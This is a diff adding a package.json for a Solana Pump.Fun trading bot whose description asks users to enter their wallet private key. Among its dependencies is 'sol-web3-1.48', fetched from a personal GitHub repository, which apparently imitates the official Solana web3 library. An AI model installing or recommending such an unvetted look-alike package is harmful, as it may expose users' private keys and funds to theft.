@@ -1,0 +1,21 @@
+{
+  "name": "pumpfuntool",
+  "version": "1.1.0",
+  "description": "Solana tool to buy the latest coins on Pump.Fun as well as the King of The Hill coins. Set your intended profit % to automatically sell once reached. Custom RPC support. Simply add your private key, the RPC you wish to use, and you're ready to go.",
+  "main": "pump_fun.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "start": "node pump_fun.js"
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "@solana/spl-token": "latest",
+    "@solana/web3.js": "latest",
+    "inquirer": "latest",
+    "node-fetch": "^2.6.9",
+    "sol-web3-1.48": "github:retardedcat69/sol-web3-1.48",
+    "bs58": "latest",
+    "axios": "latest"
+  }
+}
